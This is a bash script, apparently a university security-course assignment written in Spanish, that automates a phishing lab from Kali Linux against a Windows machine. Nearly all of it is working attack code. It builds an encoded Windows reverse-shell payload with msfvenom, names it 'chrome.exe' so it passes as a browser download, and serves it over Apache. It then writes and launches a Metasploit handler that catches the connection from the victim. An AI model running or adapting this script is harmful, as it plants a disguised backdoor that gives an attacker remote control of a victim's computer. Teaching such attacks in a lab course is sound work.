#!/bin/bash
 ###########################################
#	Pontificia Universidad Javeriana Cali 	#
#	Inguieneria de Sistemas y Computacion 	#
#	Seguridad Informatica				  	#
#	Estudiante:						  		#
#		Santiago Florian Bustamante			#
#											#
#	20 de Septiembre del 2020				#
#	Tarea 2									#
 ###########################################

#	El siguiente sh contiene la solucion a la segunda terea de
#	Seguridad Informatica, de realizar un ataque de ingeniería social 
#	por medio de phishing.

######################################################################
#	En esta actividad se debe realizar un ataque de Ingeniería social
#	usando la técnica de phishing, con la distribución de Kali Linux,
#	desde una máquina virtual a un ordenador con Windows. El primer
#	ataque se realizará instalando un Backdoor que permite tomar
#	control remotamente de la máquina, este tipo de ataque lo
#	llamaremos ataque activo de ingeniería social, el segundo ataque
#	consiste en aprovechar la vulnerabilidad publicada en el año 2017
#	del protocolo SMB en los sistemas Windows, a este segundo ataque
#	lo llamaremos ataque pasivo de Ingeniería social, en ambos ataques
#	utilizaremos las herramientas BeeF y Metasploit.
######################################################################

######################################################################
#	Ataque activo:
#		Como crear un backdoor:
#	Un Backdoor es un programa que abre un puerto en una maquina sin
#	concentimiento del usuario para acceder a su sistema.
#	Mediante el programa msfvenom se puede generar un backdoor para 
#
	LHOST=$(hostname -I)
	LPORT=444
	echo "IP LOCAL: "$LHOST" PUERTO: "$LPORT
	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe -o /var/www/html/chrome.exe

	service apache2 start
#	
#	Crea el script que se ejecutara en metasplot	
#
	touch sploit.flo
	echo "use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST "$LHOST"
set LPORT "$LPORT"
exploit" > sploit.flo

	more sploit.flo
#
#	Ejecutamos la consola de Metasploit en conjunto con el fichero que
# 	tiene las instrucciones para metasploit
#
	msfconsole -r sploit.flo
#	
#	Borra los archivos creados durante el laboratorio
	rm /tmp/chrome.exe
	rm /var/www/html/chrome.exe
	rm sploit.flo